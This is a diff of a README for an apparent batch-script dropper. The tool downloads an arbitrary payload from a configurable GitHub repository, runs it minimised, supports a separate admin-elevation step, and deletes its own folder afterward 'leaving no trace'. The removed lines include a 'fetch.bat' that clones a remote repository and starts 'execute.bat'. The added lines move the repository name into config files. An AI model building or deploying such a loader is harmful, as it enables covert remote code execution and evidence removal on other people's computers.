@@ -13,17 +13,18 @@ To install it run the "elevate.bat" no admin required for now... It will be requ
   
 3. After exiting auto-deletes the folder of payload and script leaving no trace!
 
-Costumize the github repo that is used to download the payload from the "fetch.bat" (ONLY FILE THAT CAN BE SAFE TO EDIT)
+Costumize the github repo that is used to download the payload from the .\config\user.txt / repository.txt
 
 
 + The Payloads are fully costumizable to run anything.
-+ Won't run with admin by itself! A elevation script / 3rd party is required to run the patload as admin!
-+ Any 3rd parties / any additional files can be placed in same repository besides payload. Both / All of them will be downloaded.  
++ Won't run with admin by itself! A elevation script / 3rd party is required to run the payload as admin!
++ Any 3rd parties / any additional files can be placed in same repository besides payload. Both / All of them will be downloaded.
 
 
-Code for "fetch.bat"
+Example for .\config\user.txt
 
-        @echo off
-        call git clone https://github.com/USER/REPOSITORY.git
-        start /min execute.bat
-        exit
+      john
+
+Example for .\config\repository.txt
+
+    payload.git
